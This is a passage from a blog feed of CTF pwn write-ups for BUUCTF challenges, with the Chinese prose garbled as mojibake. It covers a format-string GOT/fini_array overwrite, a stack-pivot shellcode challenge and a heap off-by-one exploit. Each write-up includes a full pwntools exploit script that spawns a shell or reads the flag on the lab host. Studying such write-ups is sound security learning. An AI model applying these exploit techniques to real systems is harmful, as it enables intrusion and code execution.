 <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>â€‹	ç¨‹åºä¸­æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†åªèƒ½æ‰§è¡Œä¸€æ¬¡æ ¼å¼åŒ–æ¼æ´å‡½æ•°ï¼Œæœ‰<code>system</code>å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>printf(format)</code>åé¢<code>main</code>å‡½æ•°å°±æ‰§è¡Œå®Œäº†ï¼Œæ‰€ä»¥ä¸ç®¡æˆ‘ä»¬ä¿®æ”¹å“ªä¸€ä¸ªå‡½æ•°çš„<code>got</code>è¡¨å€¼ä¸º<code>system@plt</code>çš„åœ°å€ï¼Œéƒ½ä¸è¡Œã€‚åæ¥çœ‹<code>wp</code>ï¼Œå‘ç°æˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>fini_array</code>çš„å‡½æ•°æŒ‡é’ˆä¸º<code>main</code>å‡½æ•°åœ°å€ï¼Œè¿™æ ·å°±èƒ½å†æ‰§è¡Œä¸€æ¬¡<code>main</code>å‡½æ•°äº†ã€‚</p>
<p>â€‹	åˆšå¼€å§‹ç”¨ä¸‹é¢è¿™ä¸ªæ–¹æ³•ï¼Œæ³„æ¼æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°åœ¨æ ˆä¸­çš„åç§»é‡ï¼Œä»¥ä¸ºæ˜¯<code>4</code>ï¼Œä¸€ç›´æ‰“ä¸é€šï¼Œè°ƒè¯•çš„æ—¶å€™æŸ¥çœ‹æ ˆä¸­çš„å€¼ï¼Œå‘ç°æ ˆä¸­çš„ç¬¬<code>1,2</code>å’Œ<code>5</code>ä¸ªå‚æ•°éƒ½æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸èƒ½ç¡®å®šå‡†ç¡®çš„åç§»é‡</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102309640.png" alt="image-20240305185357092"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102309060.png" alt="image-20240305185647495"></p>
<p>â€‹	ç„¶åæˆ‘å‘é€ä¸‹é¢è¿™ä¸ª<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaabbbb&#x27;</span>+<span class="string">b&#x27;%p%p%p%p%p&#x27;</span></span><br></pre></td></tr></table></figure>

<p>â€‹	ç°åœ¨å¯ä»¥çœ‹å‡ºæ³„æ¼çš„ç¬¬<code>1</code>ä¸ªå‚æ•°åœ°å€æ˜¯æ ˆä¸­çš„ç¬¬<code>2</code>ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è®¡ç®—åç§»é‡çš„æ—¶å€™è¦ä»<code>02</code>è¿™ä¸ªåºå·å¼€å§‹å¾€ä¸‹æ•°</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102310043.png" alt="image-20240305185704092"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sw1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26399</span>)</span><br><span class="line"><span class="comment">#debug(p,0x80485A8)</span></span><br><span class="line"><span class="comment">#context.arch=&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sw1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048534</span></span><br><span class="line">fini_array_addr = <span class="number">0x0804979C</span></span><br><span class="line">printf_got = <span class="number">0x0804989c</span></span><br><span class="line">sys_plt = <span class="number">0x080483d0</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+<span class="number">2</span>)+p32(printf_got)+p32(fini_array_addr)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x804</span>-<span class="number">12</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%4$hn&#x27;</span></span><br><span class="line"><span class="comment">#è¿™é‡Œè¿˜è¦å‡å»12ï¼Œå› ä¸ºå‰é¢å‘é€çš„3ä¸ªåœ°å€ä¸€å…±12ä¸ªå­—èŠ‚</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x83d0</span>-<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%5$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83d0</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102310684.png" alt="image-20240305190402927"></p>
]]></content>
      <categories>
        <category>BUUåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜ 2019 Not Bad</title>
    <url>/2023/11/11/BUU%E5%88%B7%E9%A2%98/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DNot%20Bad/</url>
    <content><![CDATA[<p>buuåˆ·é¢˜è®°å½•ï¼ŒæŒç»­æ›´æ–°ä¸­â€¦â€¦</p>
<span id="more"></span>

<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Not-Bad"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Not-Bad" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Bad"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]<em>Not Bad</em></h1><h2 id="ä¿æŠ¤-æºç "><a href="#ä¿æŠ¤-æºç " class="headerlink" title="ä¿æŠ¤&amp;æºç "></a>ä¿æŠ¤&amp;æºç </h2><p>ä¿æŠ¤ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102302862.png" alt="image-20240302141924012"></p>
<p>æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000</span>uLL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>â€‹	æ²¡æœ‰å¼€<code>NX</code>ä¿æŠ¤ï¼Œå¤§æ¦‚ç‡è¦ç”¨<code>shellcode</code>ï¼Œä½†æ˜¯æœ¬é¢˜å¼€äº†æ²™ç®±ï¼Œæˆ‘ä»¬åªèƒ½ä»¥<code>open,read,write</code>è¿™æ ·çš„æ–¹å¼è·å–<code>flag</code>äº†ã€‚æœ‰æ ˆæº¢å‡ºï¼Œåªèƒ½æº¢å‡º<code>0x10</code>ä¸ªå­—èŠ‚ï¼Œè€Œ<code>buf</code>æœ¬èº«ä¹Ÿåªæœ‰<code>0x20</code>ä¸ªå­—èŠ‚ï¼ŒäºŒè€…éƒ½è¾¾ä¸åˆ°æˆ‘ä»¬å†™çš„<code>shellcode</code>çš„é•¿åº¦ï¼Œæˆ‘ä»¬åªèƒ½æƒ³å…¶ä»–åŠæ³•ã€‚</p>
<p>â€‹	<code>mmap()</code>å‡½æ•°ç”¨äºå°†ä¸€ä¸ªæ–‡ä»¶æˆ–è€…è®¾å¤‡æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œä»è€Œå…è®¸å¯¹å…¶è¿›è¡Œç›´æ¥çš„è¯»å†™æ“ä½œã€‚æœ¬é¢˜ä¸­<code>mmap</code>ä¸ºæˆ‘ä»¬åˆ†é…äº†ä¸€å—å¯è¯»å¯å†™çš„å†…å­˜ï¼Œèµ·å§‹åœ°å€ä¸º<code>0x123000</code>é•¿åº¦ä¸º<code>0x1000</code>ä¸€ä¸ªå†…å­˜é¡µã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å‡½æ•°åŸå‹</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>

<p>â€‹	ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æŠŠ<code>shellcode</code>å¸ƒç½®åˆ°<code>mmap</code>ä¸ºæˆ‘ä»¬åˆ†é…çš„åœ°å€ä¸Šï¼Œç„¶åå†è°ƒç”¨<code>shellcode</code>æ‰€åœ¨çš„åœ°å€å³<code>0x123000</code>å³å¯ã€‚è¿™ä¸€æ­¥çš„<code>payload</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000</span><br></pre></td></tr></table></figure>

<p>â€‹	æˆ‘æ¥è§£é‡Šä¸€ä¸‹ä¸Šé¢çš„å†…å®¹ï¼š<code>shellcraft.read(0,mmap,0x100)</code>çš„æ„æ€æ˜¯ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å…¥æ•°æ®å†™åˆ°<code>mmap</code>ä¸ºæˆ‘ä»¬åˆ†é…çš„åœ°å€ä¸Šï¼Œç„¶åç”¨<code>mov rax,0x123000;call rax</code>è¿™ä¸¤ä¸ªæŒ‡ä»¤ï¼Œè°ƒç”¨å³å¯ã€‚</p>
<p>â€‹	ä½†æ˜¯æˆ‘ä»¬åªèƒ½æº¢å‡º<code>16</code>ä¸ªå­—èŠ‚ï¼Œä¸Šé¢è¿™äº›è‚¯å®šè¶…å‡ºäº†<code>16</code>ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠè¿™äº›å¸ƒç½®åˆ°<code>buf</code>ä¸­ï¼Œç„¶åå†æ ˆè¿ç§»åˆ°<code>buf</code>çš„èµ·å§‹åœ°å€å³å¯ï¼Œå®Œæ•´çš„<code>payload</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">sub_rsp_jmp = asm(<span class="string">&#x27;&#x27;&#x27;sub rsp,0x30;jmp rsp&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#buf+ebp+è¿”å›åœ°å€(jmp rsp) ä¸€å…±0x30ä¸ªå­—èŠ‚,ä¹Ÿå°±æ˜¯æ§åˆ¶ç¨‹åºæ‰§è¡Œæµåˆ°bufçš„èµ·å§‹åœ°å€å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#0x123000è¿™ä¸ªåœ°å€æ”¾çš„æœ‰shellcodeï¼Œè¿™é‡Œçš„æ„æ€å°±æ˜¯æ‰§è¡Œshellcode</span></span><br><span class="line"></span><br><span class="line">payload = (asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+sub_rsp_jmp</span><br></pre></td></tr></table></figure>

<p>â€‹	ç„¶åæˆ‘ä»¬åˆ©ç”¨<code>shellcraft</code>ç”Ÿæˆ<code>open,read,write</code>çš„<code>shellcode</code>ã€‚<code>shellcraft</code>æ˜¯<code>pwntools</code>åº“çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ªç”¨äºç”Ÿæˆå„ç§<code>shellcode</code>çš„æ¨¡å—ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#open(&#x27;./flag&#x27;)  æ‰“å¼€æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶</span></span><br><span class="line"><span class="comment">#read(3,addr,0x50)  3æ˜¯ä¸Šé¢æ‰“å¼€çš„æ–°æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦</span></span><br><span class="line"><span class="comment">#write(1,addr,0x50)</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)        </span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)      <span class="comment">#è¿™é‡Œæˆ‘ä»¬æŠŠè¯»å‡ºæ¥çš„å†…å®¹æ”¾åˆ°mmapåˆ†é…ç»™æˆ‘ä»¬çš„å†…å­˜åœ°å€ä¸Š</span></span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)     </span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./bad&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28453</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line">sub_rsp_jmp = asm(<span class="string">&#x27;&#x27;&#x27;sub rsp,0x30;jmp rsp&#x27;&#x27;&#x27;</span>)</span><br><span class="line">call_0x123000 = asm(<span class="string">&#x27;&#x27;&#x27;mov rax,0x123000;call rax&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = (asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+call_0x123000).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+sub_rsp_jmp</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)        </span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)     </span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>) </span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102303820.png" alt="image-20240302212556600"></p>
]]></content>
      <categories>
        <category>BUUåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcontraining_heapcreator</title>
    <url>/2024/07/11/BUU%E5%88%B7%E9%A2%98/hitcontraining_heapcreator/</url>
    <content><![CDATA[<h2 id="ä¿æŠ¤"><a href="#ä¿æŠ¤" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102332737.png" alt="image-20240710233212702"></p>
<span id="more"></span>

<h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p>â€‹	ä¸€å…±æœ‰<em>create_heap</em>ï¼Œ<em>edit_heap</em>ï¼Œ<em>show_heap</em>ï¼Œ<em>delete_heap</em>å››ä¸ªå‡½æ•°ï¼Œ<em>edit_heap</em>å‡½æ•°ä¸­æœ‰ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œåªå¯ä»¥æº¢å‡º<code>1</code>ä¸ªå­—èŠ‚ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101814056.png" alt="image-20240710181416024" style="zoom: 80%;" />

<p>â€‹	æœ¬é¢˜ä¸­ï¼Œæ¯<em>malloc</em>ä¸€æ¬¡ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡é’ˆ<em>chunk</em>å’Œä¸€ä¸ªå†…å®¹<em>chunk</em>ï¼ˆå…¶å®å°±æ˜¯ä¸¤ä¸ªåœ°å€ç©ºé—´ï¼Œåˆ†åˆ«å­˜å‚¨ç€æŒ‡å‘<em>chunk</em>ä¸­æ•°æ®çš„æŒ‡é’ˆï¼Œå’Œ<em>chunk</em>çš„æ•°æ®ï¼‰ï¼Œè€Œ<em>free</em>ä¸€æ¬¡ä¹Ÿå°±æ˜¯æŠŠè¿™ä¸¤ä¸ªåœ°å€ç©ºé—´éƒ½é‡Šæ”¾æ‰äº†ã€‚<em>show_heap</em>å’Œ<em>edit_heap</em>å‡½æ•°ä¸­æ‰“å°å’Œä¿®æ”¹çš„å†…å®¹éƒ½æ˜¯ç”±æŒ‡é’ˆå†³å®šçš„ï¼ŒæŒ‡é’ˆæŒ‡å‘ä»€ä¹ˆå°±æ‰“å°å’Œä¿®æ”¹ä»€ä¹ˆã€‚</p>
<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><h3 id="æ”¹å†™-size"><a href="#æ”¹å†™-size" class="headerlink" title="æ”¹å†™_size_"></a>æ”¹å†™_size_</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line"><span class="comment">#å¾€_chunk0_ä¸­å†™å…¥&#x27;/bin/sh\x00&#x27;ï¼Œåé¢free(chunk0)çš„æ—¶å€™å…¶å®å°±æ˜¯system(&quot;/bin/sh&quot;)</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>

<p>â€‹	å…ˆåˆ›å»ºä¸¤ä¸ª<em>chun</em>ï¼Œ<code>0x18</code>æ˜¯ä¸ºäº†åœ¨å¾€<em>chunk0</em>ä¸­å†™å†…å®¹æ—¶ï¼Œç›´æ¥è¦†ç›–æ‰<em>chunk1</em>çš„æŒ‡é’ˆ<em>chunk</em>çš„å‰<code>8</code>ä¸ªå­—èŠ‚ï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨æº¢å‡ºçš„ä¸€ä¸ªå­—èŠ‚æ”¹å†™<em>chunk1</em>çš„æŒ‡é’ˆ<em>chunk</em>çš„<em>size</em>ã€‚</p>
<p>å¦‚å›¾ï¼ŒæŒ‡é’ˆ<em>chunk</em>çš„<em>size</em>å€¼å·²ç»è¢«æ”¹å†™æˆ<code>0x41</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101923019.png" alt="image-20240710192301972"></p>
<p>â€‹	æ­¤æ—¶ï¼Œ<em>chunk1</em>çš„æŒ‡é’ˆ<em>chunk</em>ä¸å†…å®¹<em>chunk</em>ï¼Œå·²ç»éƒ¨åˆ†é‡å ï¼ˆå› ä¸ºæ˜¯æŒ‡é’ˆ<em>chunk</em>çš„<em>size</em>è¢«æ”¹å†™æˆ<code>0x41</code>ï¼Œå†…å®¹<em>chunk</em>çš„<em>size</em>è¿˜æ˜¯<code>0x21</code>ï¼Œæ‰€ä»¥å¦‚å›¾</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102116011.png" alt="image-20240710192301977" style="zoom:80%;" />

<h3 id="æ³„æ¼-free-addr"><a href="#æ³„æ¼-free-addr" class="headerlink" title="æ³„æ¼_free_addr_"></a>æ³„æ¼_free_addr_</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line"><span class="comment">#æŒ‡é’ˆå‰é¢0x30æ˜¯èƒ½å­˜å‚¨æ•°æ®çš„å¤§å°ï¼Œä¸èƒ½æ”¹å˜</span></span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><code>delete(1)</code>åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<em>fastbins</em>æœ‰ä¸¤ä¸ªä¸åŒå¤§å°çš„<em>fastbin_chunk</em>ï¼Œå¦‚å›¾</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102122798.png" alt="image-20240710212229702"></p>
<p>â€‹	ç„¶åæˆ‘ä»¬å†ç”³è¯·<code>0x30</code>çš„<em>chunk</em>ç”¨æ¥å­˜å‚¨æ•°æ®ï¼ˆè¿˜æœ‰<code>0x10</code>çš„ç©ºé—´å­˜å‚¨<em>prve_size</em>å’Œ<em>size</em>ï¼‰ï¼Œåˆå› ä¸º<em>fastbins</em>ä¸­æ­£å¥½æœ‰<code>0x40</code>çš„<em>fastbins_chunk</em>ï¼Œæ‰€ä»¥<code>0x12c2040</code>åŠä¸‹é¢<code>0x40</code>çš„å†…å­˜ç©ºé—´å°±æˆäº†æ–°<em>chunk</em>çš„å†…å­˜<em>chunk</em>ï¼Œ<code>0x12c2060</code>åŠä¸‹é¢<code>0x20</code>çš„å†…å­˜ç©ºé—´å°±æˆäº†æ–°<em>chunk</em>çš„æŒ‡é’ˆå†…å­˜ã€‚</p>
<p>â€‹	ç„¶åæˆ‘ä»¬æŠŠ<em>free@got</em>å†™åˆ°å†…å­˜<em>chunk</em>çš„<code>0x12c2078</code>åœ°å€é‡Œï¼Œè¿™ä¸ªåœ°å€å­˜å‚¨ç€æŒ‡é’ˆ<em>chunk</em>é‡Œçš„æŒ‡é’ˆï¼Œæ‰€ä»¥ç°åœ¨æŒ‡é’ˆå°±æ˜¯<em>free@got</em>ï¼Œè€Œ<em>show</em>å‡½æ•°æ‰“å°å‡ºæ¥çš„æ•°æ®æ˜¯è¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯<em>free@got</em>æŒ‡å‘çš„å†…å®¹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102155262.png" alt="image-20240710215550221"></p>
<h3 id="è¦†ç›–-free-got-è¡¨"><a href="#è¦†ç›–-free-got-è¡¨" class="headerlink" title="è¦†ç›–_free@got_è¡¨"></a>è¦†ç›–_free@got_è¡¨</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>â€‹	åŒæ ·ï¼Œ<em>edit</em>å‡½æ•°ä¿®æ”¹<em>chunk</em>å†…å®¹ï¼Œä¹Ÿæ˜¯ä¿®æ”¹æŒ‡é’ˆ<em>chunk</em>çš„æŒ‡é’ˆæŒ‡å‘çš„åŒºåŸŸã€‚å¾—åˆ°<em>system</em>çš„åœ°å€åï¼Œç›´æ¥ç”¨<em>edit</em>å‡½æ•°ä¿®æ”¹<em>chunk1</em>çš„å†…å®¹å³å¯ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102208262.png" alt="image-20240710220849174"></p>
<p>æœ€åç›´æ¥<em>free</em>æ‰<em>chunk0</em>ï¼Œä¾¿èƒ½æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ï¼Œå¾—åˆ°<em>shell</em>ã€‚</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28974</span>)</span><br><span class="line">debug(p,<span class="number">0x400DC4</span>,<span class="number">0x400DB8</span>,<span class="number">0x400DD0</span>,<span class="number">0x400DDC</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your 